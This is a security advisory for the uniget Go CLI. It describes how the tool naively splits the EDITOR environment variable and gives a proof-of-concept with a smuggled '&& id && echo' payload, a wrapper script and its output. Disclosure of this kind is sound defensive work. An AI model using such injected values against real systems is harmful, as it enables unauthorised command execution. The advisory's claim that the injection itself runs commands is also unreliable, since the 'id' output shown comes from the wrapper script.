# [M] uniget CLI has an EDITOR Command Injection

## Summary
Severity: Medium
Advisory: GHSA-qmcq-xw74-w667
CVE: CVE-2026-55061
CWE: CWE-88
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-qmcq-xw74-w667
Type: github-advisory

## Affected
- Go: `gitlab.com/uniget-org/cli` — affected >=0 <0.27.6

## Details
### Summary
The uniget CLI has a command injection vulnerability in [hooks.go](vscode-file://vscode-app/app/extra/vscode/resources/app/out/vs/code/electron-browser/workbench/workbench.html) line 199 where [strings.Split(editor, " ")](vscode-file://vscode-app/app/extra/vscode/resources/app/out/vs/code/electron-browser/workbench/workbench.html) naively parses the EDITOR environment variable without respecting shell syntax. An attacker can set EDITOR="/path/to/wrapper && id && echo" which gets split into separate arguments, allowing the wrapper script to execute arbitrary commands like id. This was successfully exploited to execute uid=1000(w4nn4d13), confirming code execution is possible. The vulnerability affects hook editing and breaks configurations with modern editors like VSCode.

**Vulnerable Code:**
```
editorWithArgs := strings.Split(editor, " ")
```

**Location Context:**
```
editor := os.Getenv("UNIGET_EDITOR")
if len(editor) == 0 {
    editor = os.Getenv("EDITOR")
}
editorWithArgs := strings.Split(editor, " ")  // ← VULNERABLE
command := exec.Command(editorWithArgs[0], editorWithArgs[1:]...)
```
**Issue:** Naive space-splitting allows injection. EDITOR="script && id && echo" splits into ["script", "&&", "id", "&&", "echo"] enabling command execution.

## **Step to Reproduce**

**Step 1: **Create malicious editor wrapper
```
mkdir -p /tmp/poc-editor
cat > /tmp/poc-editor/editor_wrapper.sh << 'EOF'
#!/bin/bash
echo "[EDITOR] Received args: $@"
id
EOF
chmod +x /tmp/poc-editor/editor_wrapper.sh
```

**Step 2: **Create test hook
```
mkdir -p ~/.config/uniget/hooks/pre-install
cat > ~/.config/uniget/hooks/pre-install/test.sh << 'EOF'
#!/bin/bash
echo "Test hook"
EOF
chmod 700 ~/.config/uniget/hooks/pre-install/test.sh
```
**Step 3:** Set injection payload
```
export EDITOR="/tmp/poc-editor/editor_wrapper.sh && id && echo"
```

**Step 4:** Run vulnerable code
```
cd /home/w4nn4d13/Downloads/cli
go build -o uniget ./cmd/uniget
./uniget hooks edit --type=pre-install test.sh
```
**Step 5:** Observe output
```
[EDITOR] Received args: && id && echo /path/to/hook
uid=1000(w4nn4d13) gid=1000(w4nn4d13) groups=1000(w4nn4d13),65534(nfsnobody)
```

<img width="1017" height="449" alt="image" src="https://github.com/user-attachments/assets/9c72ea0c-fa08-46cd-a9cb-098942a488ce" />

## References
- https://github.com/uniget-org/cli/security/advisories/GHSA-qmcq-xw74-w667
- https://github.com/uniget-org/cli/commit/7b4f18a9f00f0955f830c7ccf266ed0de5f9fd91
- https://github.com/uniget-org/cli
- https://github.com/uniget-org/cli/releases/tag/v0.27.6
